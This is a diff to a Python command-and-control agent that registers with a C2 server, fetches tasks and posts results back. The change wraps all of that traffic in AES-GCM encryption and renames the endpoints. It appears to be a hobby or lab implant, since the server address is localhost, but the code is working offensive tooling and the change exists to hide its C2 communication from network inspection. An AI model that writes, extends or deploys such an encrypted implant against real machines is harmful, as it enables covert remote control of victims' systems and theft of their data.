@@ -7,13 +7,15 @@ import requests
 import os 
 #import subprocess
 import time
+from aesgcm import *
+import base64
 
 ### configs ###
 
 c2_url = "http://127.0.0.1:5000"
 register_uri = "/agent/register"
-get_task_uri = "/agent/send_task"
-send_results_uri = "/agent/get_results"
+get_task_uri = "/agent/get_task"
+send_results_uri = "/agent/send_results"
 
 ### configs end ###
 
@@ -45,13 +47,15 @@ def register():
     """
         register the agent with the C2 server
     """
+    global data
     print("[+] Registering agent with C2 server...")
-    r = requests.post(c2_url + register_uri, json=data) ## sending the data to C2 server
+    r = requests.post(c2_url + register_uri, data=encrypt_data(data)) ## sending the data to C2 server
     if r.status_code == 200: # if the request is posted to server successfully
 
         # Then we want to check whether the agent is granted access
         # by checking the returned status
-        resp = r.json()
+        resp = decrypt_data(r.content)
+        # resp = r.json()
         if resp["status"] == "ok":
             # agent_id = resp["agent_id"]
             print("[+] Agent is authenticated with C2")
@@ -72,9 +76,9 @@ def get_task():
     """
     global latest_job_id
     print("[+] Getting task from C2 server...")
-    r = requests.post(c2_url + get_task_uri, json=data)
+    r = requests.post(c2_url + get_task_uri, data=encrypt_data(data))
     if r.status_code == 200:
-        resp = r.json()
+        resp = decrypt_data(r.content)
         if len(resp) == 0: ## no task available
             print("[+] No task available")
             return False
@@ -101,9 +105,9 @@ def send_results():
     data = {"agent_id": agent_id, "job_id": latest_job_id,"password": password, "results": results}
 
     print("[+] Sending results to C2 server...")
-    r = requests.post(c2_url + send_results_uri, json=data)
+    r = requests.post(c2_url + send_results_uri, data=encrypt_data(data))
     if r.status_code == 200:
-        resp = r.json()
+        resp = decrypt_data(r.content)
         if resp["status"] == "ok":
             print("[+] Results sent to C2 server")
             return True
